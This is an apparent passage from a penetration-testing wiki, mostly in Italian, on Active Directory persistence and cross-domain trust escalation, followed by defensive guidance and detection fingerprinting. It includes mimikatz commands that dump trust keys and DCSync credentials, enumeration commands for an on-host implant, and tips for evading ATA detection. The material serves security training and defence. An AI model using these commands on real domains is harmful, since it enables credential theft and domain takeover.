Un **Golden Ticket attack** comporta che un attaccante ottenga accesso all'**hash NTLM dell'account krbtgt** in un ambiente Active Directory (AD). Questo account è speciale perché viene usato per firmare tutti i **Ticket Granting Tickets (TGTs)**, che sono essenziali per autenticarsi all'interno della rete AD.

Una volta che l'attaccante ottiene questo hash, può creare **TGTs** per qualsiasi account scelga (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Sono come golden ticket forgiati in un modo che **aggira i comuni meccanismi di rilevamento dei golden ticket.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Avere i certificati di un account o poterli richiedere** è un ottimo modo per poter persistere nell'account utente (anche se cambia la password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Usare certificati rende possibile anche persistere con privilegi elevati all'interno del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

L'oggetto **AdminSDHolder** in Active Directory garantisce la sicurezza dei **gruppi privilegiati** (come Domain Admins e Enterprise Admins) applicando un **Access Control List (ACL)** standard su questi gruppi per impedire modifiche non autorizzate. Tuttavia, questa funzionalità può essere abusata; se un attaccante modifica l'ACL di AdminSDHolder per dare accesso completo a un utente normale, quell'utente ottiene un controllo esteso su tutti i gruppi privilegiati. Questa misura di sicurezza, pensata per proteggere, può quindi ritorcersi contro, consentendo accessi non autorizzati se non viene monitorata attentamente.

[**Ulteriori informazioni sul gruppo AdminDSHolder qui.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

All'interno di ogni **Domain Controller (DC)** esiste un account di **amministratore locale**. Ottenendo privilegi di admin su una macchina del genere, l'hash dell'Administrator locale può essere estratto usando **mimikatz**. Dopo questo, è necessaria una modifica del registro per **abilitare l'uso di questa password**, consentendo l'accesso remoto all'account Administrator locale.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Potresti **concedere** alcune **autorizzazioni speciali** a un **utente** su alcuni specifici oggetti di dominio che permetteranno all'utente di **escalare privilegi in futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

I **security descriptors** vengono usati per **archiviare** i **permessi** che un **oggetto** ha **su** un **oggetto**. Se puoi semplicemente **fare** un **piccolo cambiamento** nel **security descriptor** di un oggetto, puoi ottenere privilegi molto interessanti su quell'oggetto senza dover essere membro di un gruppo privilegiato.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abusa della classe ausiliaria `dynamicObject` per creare principali/GPO/record DNS di breve durata con `entryTTL`/`msDS-Entry-Time-To-Die`; si autoeliminano senza tombstone, cancellando le evidenze LDAP e lasciando SID orfani, riferimenti `gPLink` rotti o risposte DNS nella cache (ad es. inquinamento delle ACE di AdminSDHolder o redirect malevoli di `gPCFileSysPath`/DNS integrato in AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Modifica **LSASS** in memoria per stabilire una **password universale**, garantendo accesso a tutti gli account di dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Scopri cos'è un SSP (Security Support Provider) qui.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puoi creare il tuo **SSP** per **catturare** in **clear text** le **credenziali** usate per accedere alla macchina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuovo Domain Controller** nell'AD e lo usa per **spingere attributi** (SIDHistory, SPNs...) su oggetti specificati **senza** lasciare alcun **log** riguardo alle **modifiche**. Hai bisogno di privilegi **DA** e di trovarti nel **dominio radice**.\
Nota che se usi dati errati, appariranno log piuttosto brutti.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

In precedenza abbiamo discusso di come escalare privilegi se hai **permessi sufficienti per leggere le password LAPS**. Tuttavia, queste password possono essere usate anche per **mantenere la persistenza**.\
Controlla:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considera il **Forest** come il confine di sicurezza. Questo implica che **compromettere un singolo dominio potrebbe potenzialmente portare al compromesso dell'intero Forest**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) è un meccanismo di sicurezza che consente a un utente di un **dominio** di accedere alle risorse in un altro **dominio**. Crea essenzialmente un collegamento tra i sistemi di autenticazione dei due domini, consentendo alle verifiche di autenticazione di fluire senza problemi. Quando i domini configurano un trust, si scambiano e conservano specifiche **chiavi** nei rispettivi **Domain Controllers (DCs)**, che sono fondamentali per l'integrità del trust.

In uno scenario tipico, se un utente intende accedere a un servizio in un **dominio trusted**, deve prima richiedere un ticket speciale noto come **inter-realm TGT** dal DC del proprio dominio. Questo TGT è cifrato con una **chiave** condivisa su cui entrambi i domini hanno concordato. L'utente presenta quindi questo TGT al **DC del dominio trusted** per ottenere un ticket di servizio (**TGS**). Dopo la convalida riuscita dell'inter-realm TGT da parte del DC del dominio trusted, viene emesso un TGS, che consente all'utente di accedere al servizio.

**Passaggi**:

1. Un **client computer** nel **Domain 1** avvia il processo usando il proprio **hash NTLM** per richiedere un **Ticket Granting Ticket (TGT)** al proprio **Domain Controller (DC1)**.
2. DC1 emette un nuovo TGT se il client viene autenticato con successo.
3. Il client richiede quindi un **inter-realm TGT** da DC1, necessario per accedere alle risorse nel **Domain 2**.
4. L'inter-realm TGT è cifrato con una **trust key** condivisa tra DC1 e DC2 come parte del domain trust bidirezionale.
5. Il client porta l'inter-realm TGT al **Domain Controller (DC2) del Domain 2**.
6. DC2 verifica l'inter-realm TGT usando la sua trust key condivisa e, se valido, emette un **Ticket Granting Service (TGS)** per il server nel Domain 2 a cui il client vuole accedere.
7. Infine, il client presenta questo TGS al server, che è cifrato con l'hash dell'account del server, per ottenere accesso al servizio nel Domain 2.

### Different trusts

È importante notare che **un trust può essere a 1 via o a 2 vie**. Nelle opzioni a 2 vie, entrambi i domini si fidano l'uno dell'altro, ma nella relazione di trust a **1 via** uno dei domini sarà il **trusted** e l'altro il dominio **trusting**. Nell'ultimo caso, **sarai in grado di accedere alle risorse all'interno del dominio trusting solo dal trusted**.

Se Domain A si fida di Domain B, A è il dominio trusting e B è quello trusted. Inoltre, in **Domain A**, questo sarebbe un **Outbound trust**; e in **Domain B**, questo sarebbe un **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Questa è una configurazione comune all'interno dello stesso forest, in cui un child domain ha automaticamente un trust bidirezionale transitive con il suo parent domain. In sostanza, questo significa che le richieste di autenticazione possono fluire senza problemi tra il parent e il child.
- **Cross-link Trusts**: Chiamati "shortcut trusts", sono stabiliti tra child domain per accelerare i processi di referral. In forest complessi, i referral di autenticazione di solito devono risalire fino alla forest root e poi scendere fino al dominio di destinazione. Creando cross-link, il percorso si accorcia, il che è particolarmente utile in ambienti geograficamente distribuiti.
- **External Trusts**: Sono configurati tra domini diversi e non correlati e sono, per natura, non transitive. Secondo la [documentazione Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), gli external trust sono utili per accedere alle risorse in un dominio esterno all'attuale forest che non è collegato da un forest trust. La sicurezza è rafforzata tramite SID filtering con gli external trust.
- **Tree-root Trusts**: Questi trust vengono stabiliti automaticamente tra il forest root domain e un nuovo tree root aggiunto. Anche se non si incontrano comunemente, i tree-root trust sono importanti per aggiungere nuovi domain tree a un forest, consentendo loro di mantenere un nome di dominio univoco e garantendo la transitività bidirezionale. Ulteriori informazioni si trovano nella [guida Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Questo tipo di trust è un trust bidirezionale transitive tra due forest root domain, che applica anche SID filtering per rafforzare le misure di sicurezza.
- **MIT Trusts**: Questi trust sono stabiliti con Kerberos domain non Windows, conformi a [RFC4120](https://tools.ietf.org/html/rfc4120). I MIT trust sono un po' più specializzati e si rivolgono ad ambienti che richiedono integrazione con sistemi basati su Kerberos al di fuori dell'ecosistema Windows.

#### Other differences in **trusting relationships**

- Una trust relationship può anche essere **transitiva** (A si fida di B, B si fida di C, allora A si fida di C) o **non transitiva**.
- Una trust relationship può essere configurata come **bidirectional trust** (entrambi si fidano l'uno dell'altro) oppure come **one-way trust** (solo uno dei due si fida dell'altro).

### Attack Path

1. **Enumerare** le trusting relationships
2. Verificare se qualche **security principal** (user/group/computer) ha **accesso** alle risorse dell'**altro dominio**, magari tramite voci ACE o perché presente nei gruppi dell'altro dominio. Cerca **relazioni tra domini** (il trust è stato creato probabilmente per questo).
1. kerberoast in questo caso potrebbe essere un'altra opzione.
3. **Compromettere** gli **account** che possono **pivotare** attraverso i domini.

Gli attacker con accesso a risorse in un altro dominio possono farlo tramite tre meccanismi principali:

- **Local Group Membership**: I principal possono essere aggiunti ai gruppi locali sulle macchine, come il gruppo “Administrators” su un server, ottenendo un controllo significativo su quella macchina.
- **Foreign Domain Group Membership**: I principal possono anche essere membri di gruppi all'interno del foreign domain. Tuttavia, l'efficacia di questo metodo dipende dalla natura del trust e dall'ambito del gruppo.
- **Access Control Lists (ACLs)**: I principal possono essere specificati in un'**ACL**, in particolare come entità in **ACE** all'interno di una **DACL**, fornendo loro accesso a risorse specifiche. Per chi vuole approfondire i meccanismi di ACL, DACL e ACE, il whitepaper intitolato “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” è una risorsa preziosa.

### Find external users/groups with permissions

Puoi controllare **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** per trovare foreign security principals nel domain. Questi saranno user/group provenienti da **un dominio/forest esterno**.

Puoi verificarlo in **Bloodhound** o usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalatione di privilegi da Child a Parent forest
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Altri modi per enumerare i trust del domain:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Ci sono **2 trusted keys**, una per _Child --> Parent_ e un’altra per _Parent_ --> _Child_.\
> Puoi trovare quella usata dal current domain con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate da Enterprise admin al child/parent domain abusando della trust con SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Capire come la Configuration Naming Context (NC) può essere sfruttata è cruciale. La Configuration NC funge da repository centrale per i dati di configurazione in tutta una forest negli ambienti Active Directory (AD). Questi dati vengono replicati su ogni Domain Controller (DC) all'interno della forest, con i DC scrivibili che mantengono una copia scrivibile della Configuration NC. Per sfruttarla, bisogna avere **privilegi SYSTEM su un DC**, preferibilmente un child DC.

**Link GPO to root DC site**

Il container Sites della Configuration NC include informazioni sui site di tutti i computer joined al domain all'interno della AD forest. Operando con privilegi SYSTEM su qualsiasi DC, gli attaccanti possono collegare GPO ai root DC sites. Questa azione può compromettere il root domain manipolando le policy applicate a questi site.

Per informazioni più approfondite, si può esplorare la ricerca su [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vettore di attacco consiste nel prendere di mira gMSA privilegiati all'interno del domain. La KDS Root key, essenziale per calcolare le password dei gMSA, è memorizzata nella Configuration NC. Con privilegi SYSTEM su qualsiasi DC, è possibile accedere alla KDS Root key e calcolare le password per qualsiasi gMSA in tutta la forest.

Analisi dettagliata e guida passo passo si possono trovare in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attacco delegated MSA complementare (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ricerca esterna aggiuntiva: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Questo metodo richiede pazienza, aspettando la creazione di nuovi oggetti AD privilegiati. Con privilegi SYSTEM, un attaccante può modificare lo AD Schema per concedere a qualsiasi utente il pieno controllo su tutte le classi. Questo potrebbe portare ad accesso non autorizzato e controllo sui nuovi oggetti AD creati.

Ulteriori letture sono disponibili su [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnerabilità ADCS ESC5 prende di mira il controllo sugli oggetti Public Key Infrastructure (PKI) per creare un certificate template che consenta l’autenticazione come qualsiasi utente all’interno della forest. Poiché gli oggetti PKI risiedono nella Configuration NC, compromettere un child DC scrivibile abilita l’esecuzione di attacchi ESC5.

Maggiori dettagli su questo si possono leggere in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenari privi di ADCS, l’attaccante ha la capacità di configurare i componenti necessari, come discusso in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In questo scenario **il tuo domain è trusted** da uno esterno, dandoti **permessi indeterminati** su di esso. Dovrai scoprire **quali principal del tuo domain hanno quale accesso sul domain esterno** e poi provare a sfruttarlo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In questo scenario **your domain** sta **trusted** alcune **privileges** a un principal di **different domains**.

Tuttavia, quando un **domain is trusted** dal trusting domain, il trusted domain **crea un user** con un **predictable name** che usa come **password the trusted password**. Questo significa che è possibile **access a user from the trusting domain to get inside the trusted one** per enumerarlo e provare a elevare ulteriori privilegi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Un altro modo per compromettere il trusted domain è trovare un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creato nella **opposite direction** del domain trust (cosa non molto comune).

Un altro modo per compromettere il trusted domain è aspettare in una macchina dove un **user from the trusted domain can access** di effettuare il login via **RDP**. Quindi, l'attaccante potrebbe iniettare codice nel processo della sessione RDP e **access the origin domain of the victim** da lì.\
Inoltre, se la **victim mounted his hard drive**, dal processo della **RDP session** l'attaccante potrebbe salvare **backdoors** nella **startup folder of the hard drive**. Questa tecnica si chiama **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Il rischio di attacchi che sfruttano l'attributo SID history attraverso forest trusts è mitigato da SID Filtering, che è attivato di default su tutti gli inter-forest trusts. Questo si basa sull'assunzione che gli intra-forest trusts siano sicuri, considerando la forest, piuttosto che il domain, come security boundary secondo la posizione di Microsoft.
- Tuttavia, c'è un problema: SID filtering potrebbe interrompere applicazioni e accesso degli utenti, portandone a volte alla disattivazione.

### **Selective Authentication:**

- Per gli inter-forest trusts, l'uso di Selective Authentication garantisce che gli utenti delle due forest non siano autenticati automaticamente. Invece, sono necessari permessi espliciti per consentire agli utenti di accedere a domain e server all'interno del trusting domain o della forest.
- È importante notare che queste misure non proteggono dallo sfruttamento del writable Configuration Naming Context (NC) o dagli attacchi all'account del trust.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolve short names/OU paths into full DNs and dump the corresponding objects.
- `get-object`, `get-attribute`, and `get-domaininfo` pull arbitrary attributes (including security descriptors) plus the forest/domain metadata from `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expose roasting candidates, delegation settings, and existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors directly from LDAP.
- `get-acl` and `get-writable --detailed` parse the DACL to list trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), and inheritance, giving immediate targets for ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitive LDAP di scrittura per escalation & persistenza

- I BOF di creazione oggetti (`add-user`, `add-computer`, `add-group`, `add-ou`) permettono all’operatore di predisporre nuovi principal o account macchina ovunque esistano diritti OU. `add-groupmember`, `set-password`, `add-attribute`, e `set-attribute` dirottano direttamente i target una volta trovati i diritti write-property.
- I comandi focalizzati su ACL come `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, e `add-dcsync` trasformano WriteDACL/WriteOwner su qualsiasi oggetto AD in reset di password, controllo dell’appartenenza ai gruppi, o privilegi di replica DCSync senza lasciare artefatti PowerShell/ADSI. I corrispondenti `remove-*` ripuliscono le ACE iniettate.

### Delegation, roasting, e abuso di Kerberos

- `add-spn`/`set-spn` rendono istantaneamente un utente compromesso Kerberoastable; `add-asreproastable` (toggle UAC) lo marca per AS-REP roasting senza toccare la password.
- Le macro di delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) riscrivono `msDS-AllowedToDelegateTo`, i flag UAC, o `msDS-AllowedToActOnBehalfOfOtherIdentity` dal beacon, abilitando i percorsi di attacco constrained/unconstrained/RBCD ed eliminando la necessità di remote PowerShell o RSAT.

### Iniezione sidHistory, relocation OU, e shaping della superficie d’attacco

- `add-sidhistory` inietta SID privilegiati nella SID history di un principal controllato (vedi [SID-History Injection](sid-history-injection.md)), fornendo un’ereditarietà di accesso stealthy completamente via LDAP/LDAPS.
- `move-object` cambia il DN/OU di computer o utenti, permettendo a un attacker di trascinare asset in OU dove esistono già diritti delegati prima di abusare di `set-password`, `add-groupmember`, o `add-spn`.
- I comandi di rimozione a scope stretto (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ecc.) permettono un rollback rapido dopo che l’operatore ha raccolto credenziali o persistence, minimizzando la telemetria.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Alcune difese generali

[**Scopri di più su come proteggere le credenziali qui.**](../stealing-credentials/credentials-protections.md)

### **Misure difensive per la protezione delle credenziali**

- **Restrizioni per i Domain Admins**: Si raccomanda che i Domain Admins possano fare login solo sui Domain Controllers, evitando il loro utilizzo su altri host.
- **Privilegi degli account di servizio**: I servizi non dovrebbero essere eseguiti con privilegi Domain Admin (DA) per mantenere la sicurezza.
- **Limitazione temporale dei privilegi**: Per i task che richiedono privilegi DA, la loro durata dovrebbe essere limitata. Questo può essere ottenuto con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigazione del LDAP relay**: Verifica gli Event ID 2889/3074/3075 e poi applica LDAP signing e LDAPS channel binding sui DC/client per bloccare tentativi di LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting a livello di protocollo dell’attività di Impacket

Se vuoi rilevare il comune AD tradecraft, **non affidarti solo agli artefatti controllabili dall’operatore** come binari rinominati, nomi di servizio, file batch temporanei o path di output. Definisci una baseline di come i client Windows legittimi costruiscono traffico [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, e WMI, poi cerca **quirk di implementazione** che restano anche dopo che l’operatore modifica `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, o `ntlmrelayx.py`.

- **Candidate standalone ad alta confidenza** (dopo la validazione sulla tua baseline):
- DCE/RPC autenticato usando `auth_context_id = 79231 + ctx_id`
- Padding di autenticazione DCE/RPC riempito con `0xff`
- LDAP Kerberos bind che inseriscono un `AP-REQ` Kerberos grezzo direttamente nel `mechToken` SPNEGO
- Richieste SMB2/3 negotiate con valori `ClientGuid` che sembrano ASCII
- WMI `IWbemLevel1Login::NTLMLogin` usando il namespace non standard `//./root/cimv2`
- Valori hardcoded del nonce Kerberos
- **Meglio come feature di correlazione/scoring**:
- Elenchi di etype Kerberos sparsi o duplicati, `PA-DATA` insolito/mancante, o ordering degli etype nelle TGS-REQ diverso da quello di Windows nativo
- Messaggi NTLM Type 1 senza informazioni di versione o messaggi Type 3 con nomi host nulli
- NTLMSSP grezzo trasportato in DCE/RPC invece che in SPNEGO, trailer di verifica DCE/RPC mancanti, o mismatch degli OID SPNEGO/Kerberos
- Più di uno di questi tratti dallo stesso host/utente/finestra temporale è molto più forte di qualsiasi singolo campo debole
- **Da usare come enrichment, non come alert standalone**:
- Nomi file di default, path di output, nomi di servizio casuali, nomi di batch temporanei, nomi di account computer di default, e stringhe HTTP/WebDAV/RDP/MSSQL specifiche del tool
- Questi sono facili da cambiare per gli operatori e sono utili soprattutto per spiegare perché un cluster cross-protocol è sospetto
- **Note operative**:
- Alcuni di questi segnali richiedono traffico decifrato, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, o visibilità lato servizio
- Valida rispetto a client Samba/Linux, appliance, e software legacy prima di promuoverli ad alert
- Promuovi le detection da enrichment -> hunting -> alerting man mano che costruisci fiducia nella baseline

### **Implementazione di tecniche di deception**

- Implementare deception significa piazzare trappole, come utenti o computer esca, con feature come password che non scadono o che sono marcati come Trusted for Delegation. Un approccio dettagliato include la creazione di utenti con diritti specifici o l’aggiunta a gruppi ad alto privilegio.
- Un esempio pratico prevede l’uso di strumenti come: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Maggiori informazioni sul deployment di tecniche di deception si trovano su [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificazione della deception**

- **Per gli oggetti User**: Gli indicatori sospetti includono ObjectSID atipico, logon poco frequenti, date di creazione, e bassi conteggi di bad password.
- **Indicatori generali**: Confrontare gli attributi di potenziali oggetti esca con quelli di oggetti reali può rivelare incoerenze. Strumenti come [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) possono aiutare a identificare tali deception.

### **Bypassing dei sistemi di detection**

- **Microsoft ATA Detection Bypass**:
- **Enumerazione utenti**: Evitare l’enumerazione delle sessioni sui Domain Controllers per prevenire la detection di ATA.
- **Impersonazione del ticket**: L’uso di chiavi **aes** per la creazione dei ticket aiuta a eludere la detection evitando il downgrade a NTLM.
- **DCSync Attacks**: È consigliato eseguirli da un host non-Domain Controller per evitare la detection di ATA, poiché l’esecuzione diretta da un Domain Controller attiverà alert.

## Riferimenti

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)

{{#include ../../banners/hacktricks-training.md}}
